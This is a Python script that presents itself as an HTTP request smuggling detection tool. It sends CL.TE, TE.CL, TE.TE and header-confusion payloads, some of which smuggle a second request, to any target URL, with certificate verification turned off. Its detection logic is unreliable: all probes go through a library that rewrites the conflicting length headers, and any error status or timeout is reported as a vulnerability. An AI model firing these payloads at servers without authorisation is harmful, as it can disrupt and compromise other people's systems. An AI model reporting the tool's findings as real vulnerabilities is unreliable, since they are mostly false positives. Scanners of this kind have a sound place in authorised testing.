import requests
import socket
import ssl
import argparse
import sys
import time
from urllib.parse import urlparse
from colorama import Fore, Style, init
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

class HTTPRequestSmuggler:
    def __init__(self, target_url, timeout=30, verbose=False, use_requests=True):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.timeout = timeout
        self.verbose = verbose
        self.use_requests = use_requests  # Fallback to requests library
        self.host = self.parsed_url.netloc.split(':')[0]
        
        # Parse port
        if ':' in self.parsed_url.netloc:
            self.port = int(self.parsed_url.netloc.split(':')[1])
        else:
            self.port = 443 if self.parsed_url.scheme == 'https' else 80
            
        self.use_ssl = self.parsed_url.scheme == 'https'
        self.session = requests.Session()
        self.session.verify = False
        
    def print_info(self, message):
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {message}")
    
    def print_success(self, message):
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")
    
    def print_warning(self, message):
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")
    
    def print_error(self, message):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {message}")
    
    def test_connection(self):
        """Test if target is reachable"""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            self.print_success(f"Target is reachable (Status: {response.status_code})")
            return True
        except Exception as e:
            self.print_error(f"Target is not reachable: {e}")
            return False
    
    def create_connection(self):
        """Create a socket connection with better error handling"""
        max_retries = 3
        retry_delay = 2
        
        for attempt in range(max_retries):
            try:
                if self.verbose:
                    self.print_info(f"Connection attempt {attempt + 1}/{max_retries}")
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                
                # Try to resolve hostname first
                try:
                    ip_address = socket.gethostbyname(self.host)
                    if self.verbose:
                        self.print_info(f"Resolved {self.host} to {ip_address}")
                except socket.gaierror as e:
                    self.print_error(f"DNS resolution failed: {e}")
                    return None
                
                # Connect to the server
                sock.connect((self.host, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    context.set_ciphers('DEFAULT@SECLEVEL=1')
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                if self.verbose:
                    self.print_success(f"Connected to {self.host}:{self.port}")
                
                return sock
                
            except socket.timeout:
                self.print_warning(f"Connection timeout (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
            except ConnectionRefusedError:
                self.print_error("Connection refused by target")
                return None
            except Exception as e:
                if attempt == max_retries - 1:
                    self.print_error(f"Connection failed: {e}")
                else:
                    self.print_warning(f"Connection error: {e}, retrying...")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
        
        return None
    
    def send_raw_request(self, request):
        """Send raw HTTP request with improved error handling"""
        if self.use_requests:
            # Fallback to requests library
            return self.send_with_requests_library(request)
        
        sock = self.create_connection()
        if not sock:
            # Fallback to requests library
            self.print_warning("Falling back to requests library...")
            return self.send_with_requests_library(request)
        
        try:
            if self.verbose:
                self.print_info("Sending request:")
                print(f"{Fore.YELLOW}{request[:200]}...{Style.RESET_ALL}")
            
            sock.sendall(request.encode())
            response = b""
            sock.settimeout(5)  # Shorter timeout for receiving
            
            start_time = time.time()
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    
                    # Break if we have complete response
                    if b"\r\n\r\n" in response and (
                        b"Content-Length: 0" in response or 
                        b"</html>" in response or
                        b"</body>" in response
                    ):
                        break
                    
                    # Safety timeout
                    if time.time() - start_time > 10:
                        break
                        
                except socket.timeout:
                    break
            
            sock.close()
            return response.decode('utf-8', errors='ignore')
        
        except Exception as e:
            self.print_error(f"Error sending request: {e}")
            if sock:
                sock.close()
            return None
    
    def send_with_requests_library(self, raw_request):
        """Parse raw HTTP request and send using requests library"""
        try:
            lines = raw_request.split('\r\n')
            method_line = lines[0].split()
            method = method_line[0] if len(method_line) > 0 else 'GET'
            path = method_line[1] if len(method_line) > 1 else '/'
            
            headers = {}
            body = ""
            in_body = False
            
            for line in lines[1:]:
                if not line:
                    in_body = True
                    continue
                
                if in_body:
                    body += line
                elif ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()
            
            url = self.target_url + path
            
            if method.upper() == 'POST':
                response = self.session.post(
                    url, 
                    headers=headers, 
                    data=body, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:
                response = self.session.get(
                    url, 
                    headers=headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            return f"HTTP/1.1 {response.status_code} {response.reason}\r\n{response.text}"
        
        except Exception as e:
            self.print_error(f"Requests library error: {e}")
            return None
    
    def test_cl_te_desync(self):
        """Test CL.TE with both methods"""
        self.print_info("Testing CL.TE desync vulnerability...")
        
        # Method 1: Using requests library with custom headers
        try:
            headers = {
                'Content-Length': '6',
                'Transfer-Encoding': 'chunked'
            }
            body = "0\r\n\r\nG"
            
            response = self.session.post(
                self.target_url,
                headers=headers,
                data=body,
                timeout=self.timeout
            )
            
            if response.status_code in [400, 500, 502, 503]:
                self.print_success(f"Potential CL.TE desync detected! (Status: {response.status_code})")
                return True
                
        except requests.exceptions.Timeout:
            self.print_warning("Request timeout - possible desync")
            return True
        except Exception as e:
            if self.verbose:
                self.print_warning(f"Error in CL.TE test: {e}")
        
        self.print_info("No CL.TE desync detected")
        return False
    
    def test_te_cl_desync(self):
        """Test TE.CL desync"""
        self.print_info("Testing TE.CL desync vulnerability...")
        
        try:
            # Using requests with conflicting headers
            headers = {
                'Transfer-Encoding': 'chunked',
                'Content-Length': '4'
            }
            body = "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
            
            response = self.session.post(
                self.target_url,
                headers=headers,
                data=body,
                timeout=self.timeout
            )
            
            if response.status_code in [400, 500, 502, 503]:
                self.print_success(f"Potential TE.CL desync detected! (Status: {response.status_code})")
                return True
                
        except requests.exceptions.Timeout:
            self.print_warning("Request timeout - possible desync")
            return True
        except Exception as e:
            if self.verbose:
                self.print_warning(f"Error in TE.CL test: {e}")
        
        self.print_info("No TE.CL desync detected")
        return False
    
    def test_te_te_desync(self):
        """Test TE.TE with obfuscated headers"""
        self.print_info("Testing TE.TE desync vulnerability...")
        
        obfuscations = [
            {'Transfer-Encoding': 'chunked', 'Transfer-encoding': 'identity'},
            {'Transfer-Encoding': 'chunked', 'Transfer-Encoding ': 'identity'},
            {'Transfer-Encoding': 'chunked', ' Transfer-Encoding': 'identity'},
        ]
        
        for headers in obfuscations:
            try:
                response = self.session.post(
                    self.target_url,
                    headers=headers,
                    data="0\r\n\r\n",
                    timeout=self.timeout
                )
                
                if response.status_code in [400, 500, 502, 503]:
                    self.print_success(f"Potential TE.TE desync detected! (Status: {response.status_code})")
                    return True
                    
            except Exception as e:
                if self.verbose:
                    self.print_warning(f"Error in TE.TE test: {e}")
        
        self.print_info("No TE.TE desync detected")
        return False
    
    def test_timing_based_detection(self):
        """Simplified timing test"""
        self.print_info("Testing timing-based detection...")
        
        try:
            # Normal request
            start = time.time()
            self.session.get(self.target_url, timeout=self.timeout)
            normal_time = time.time() - start
            
            # Potentially smuggled request
            headers = {
                'Content-Length': '6',
                'Transfer-Encoding': 'chunked'
            }
            start = time.time()
            try:
                self.session.post(
                    self.target_url,
                    headers=headers,
                    data="0\r\n\r\nGET /404 HTTP/1.1\r\n",
                    timeout=self.timeout
                )
                smuggled_time = time.time() - start
            except:
                smuggled_time = time.time() - start
            
            self.print_info(f"Normal: {normal_time:.2f}s, Smuggled: {smuggled_time:.2f}s")
            
            if smuggled_time > normal_time * 1.5:
                self.print_warning("Timing difference detected")
                return True
                
        except Exception as e:
            if self.verbose:
                self.print_warning(f"Error in timing test: {e}")
        
        return False
    
    def test_differential_responses(self):
        """Test for differential responses"""
        self.print_info("Testing differential responses...")
        
        try:
            headers = {
                'Content-Length': '49',
                'Transfer-Encoding': 'chunked'
            }
            body = "e\r\nq=smuggling&x=\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x"
            
            response = self.session.post(
                self.target_url,
                headers=headers,
                data=body,
                timeout=self.timeout
            )
            
            if "404" in response.text or response.status_code == 404:
                self.print_success("Differential response detected!")
                return True
                
        except Exception as e:
            if self.verbose:
                self.print_warning(f"Error in differential test: {e}")
        
        return False
    
    def test_header_confusion(self):
        """Test header confusion"""
        self.print_info("Testing header confusion...")
        
        confusion_tests = [
            {'Content-Length': '6', 'Content-Length ': '0'},  # Space after header
            {'Content-Length': ['6', '0']},  # Multiple values
        ]
        
        for headers in confusion_tests:
            try:
                response = self.session.post(
                    self.target_url,
                    headers=headers,
                    data="12345",
                    timeout=self.timeout
                )
                
                if response.status_code in [400, 500, 502, 503]:
                    self.print_success(f"Header confusion detected! (Status: {response.status_code})")
                    return True
                    
            except Exception as e:
                if self.verbose:
                    self.print_warning(f"Error in confusion test: {e}")
        
        return False
    
    def run_all_tests(self):
        """Run all tests with better error handling"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}HTTP Request Smuggling Detection Tool{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        self.print_info(f"Target: {self.target_url}")
        self.print_info(f"Host: {self.host}")
        self.print_info(f"Port: {self.port}")
        self.print_info(f"SSL: {self.use_ssl}")
        self.print_info(f"Timeout: {self.timeout}s\n")
        
        # Test connectivity first
        if not self.test_connection():
            self.print_error("Cannot reach target. Exiting...")
            return
        
        vulnerabilities = []
        
        tests = [
            ("CL.TE Desync", self.test_cl_te_desync),
            ("TE.CL Desync", self.test_te_cl_desync),
            ("TE.TE Desync", self.test_te_te_desync),
            ("Timing-based Detection", self.test_timing_based_detection),
            ("Differential Responses", self.test_differential_responses),
            ("Header Confusion", self.test_header_confusion),
        ]
        
        for test_name, test_func in tests:
            print(f"\n{Fore.YELLOW}{'─'*70}{Style.RESET_ALL}")
            try:
                if test_func():
                    vulnerabilities.append(test_name)
            except KeyboardInterrupt:
                self.print_warning("\nScan interrupted by user")
                break
            except Exception as e:
                self.print_error(f"Error in {test_name}: {e}")
            time.sleep(1)  # Delay between tests
        
        # Summary
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        if vulnerabilities:
            self.print_warning(f"Found {len(vulnerabilities)} potential vulnerability(ies):")
            for vuln in vulnerabilities:
                print(f"  {Fore.RED}• {vuln}{Style.RESET_ALL}")
        else:
            self.print_success("No request smuggling vulnerabilities detected")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def main():
    parser = argparse.ArgumentParser(
        description='HTTP Request Smuggling Detection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Timeout in seconds (default: 30)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-requests', action='store_true', help='Disable requests library fallback')
    
    args = parser.parse_args()
    
    smuggler = HTTPRequestSmuggler(
        args.url, 
        args.timeout, 
        args.verbose,
        use_requests=not args.no_requests
    )
    smuggler.run_all_tests()


if __name__ == "__main__":
    main()